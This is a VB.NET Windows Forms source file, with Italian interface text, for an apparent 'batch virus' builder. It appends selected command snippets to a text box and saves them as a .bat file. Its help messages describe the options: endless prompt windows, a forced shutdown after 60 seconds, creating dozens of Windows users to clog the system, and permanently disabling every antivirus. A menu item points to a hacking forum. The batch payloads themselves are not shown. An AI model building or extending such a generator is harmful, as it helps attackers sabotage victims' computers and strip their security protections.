Public Class Form1


    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles c.TextChanged

    End Sub

    Private Sub EsciToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EsciToolStripMenuItem.Click
        End
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        s.Text = cmd.Text
        c.Text = c.Text & cmd.Text



    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        c.Text = ""

    End Sub

    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        s.Text = note.Text
        c.Text = c.Text & note.Text
    End Sub

    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        s.Text = spegni.Text
        c.Text = c.Text & spegni.Text

    End Sub

    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        s.Text = antivirus.Text
        c.Text = c.Text & antivirus.Text
    End Sub

    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        s.Text = utenti.Text
        c.Text = c.Text & utenti.Text
    End Sub

    Private Sub ApriInfiniteFinestreDelPromptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ApriInfiniteFinestreDelPromptToolStripMenuItem.Click
        MsgBox("si può usare soltanto uno dei due comandi che fanno aprire infinite finestre, per il corretto funzionamento è necessario selezionarlo come ultimo comando")
    End Sub

    Private Sub SpegniPcDopo60SecondiToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SpegniPcDopo60SecondiToolStripMenuItem.Click
        MsgBox("questo comando serve a far spegnere il pc dopo 60 secondi, per aumentare il numero di secondi da attendere basta sostituire a 60 il numero che si vuole *possibilmente inferiore a 500")

    End Sub

    Private Sub Crea74UtentiConPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Crea74UtentiConPasswordToolStripMenuItem.Click
        MsgBox("questo comando permette di creare altri 50 utenti in windows intasando il sistema e causando parecchi problemi di gestione")
    End Sub

    Private Sub DisabilitaOgniAntivirusToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DisabilitaOgniAntivirusToolStripMenuItem.Click
        MsgBox("questo comando disabilita permanentemente ogni antivirus")
    End Sub

    Private Sub CopiaUttoIlCodiceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CopiaUttoIlCodiceToolStripMenuItem.Click
        c.Copy()

    End Sub

    Private Sub CopiaIlSingoloCodiceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CopiaIlSingoloCodiceToolStripMenuItem.Click
        s.Copy()
    End Sub

    Private Sub CancellaSingoloCodiceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CancellaSingoloCodiceToolStripMenuItem.Click
        s.Text = ""
    End Sub

    Private Sub CancellaCodiceCompetoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CancellaCodiceCompetoToolStripMenuItem.Click
        c.Text = ""
    End Sub

    Private Sub CancellaTuttoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CancellaTuttoToolStripMenuItem.Click
        s.Text = ""
        c.Text = ""
    End Sub

    Private Sub SalvaBatToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SalvaBatToolStripMenuItem.Click
        Dim save As New SaveFileDialog()
        Dim mystreamwriter As System.IO.StreamWriter
        save.Filter = "Batch |*.bat"
        save.CheckPathExists = True
        save.Title = "Save Files"
        save.ShowDialog(Me)
        Try
            mystreamwriter = System.IO.File.AppendText(save.FileName)
            mystreamwriter.Write(c.Text)
            mystreamwriter.Flush()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        MsgBox("qui appare l'ultimo codice selezionato")
    End Sub

    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        MsgBox("qui appare il codice completo")
    End Sub

    Private Sub LordtexterToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LordtexterToolStripMenuItem.Click
        Form3.Show()
    End Sub

    Private Sub HttpextremehackforumfreenetToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HttpextremehackforumfreenetToolStripMenuItem.Click
        Form2.Show()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim save As New SaveFileDialog()
        Dim mystreamwriter As System.IO.StreamWriter
        save.Filter = "Batch |*.bat"
        save.CheckPathExists = True
        save.Title = "Save Files"
        save.ShowDialog(Me)
        Try
            mystreamwriter = System.IO.File.AppendText(save.FileName)
            mystreamwriter.Write(c.Text)
            mystreamwriter.Flush()
        Catch ex As Exception

        End Try
    End Sub
End Class
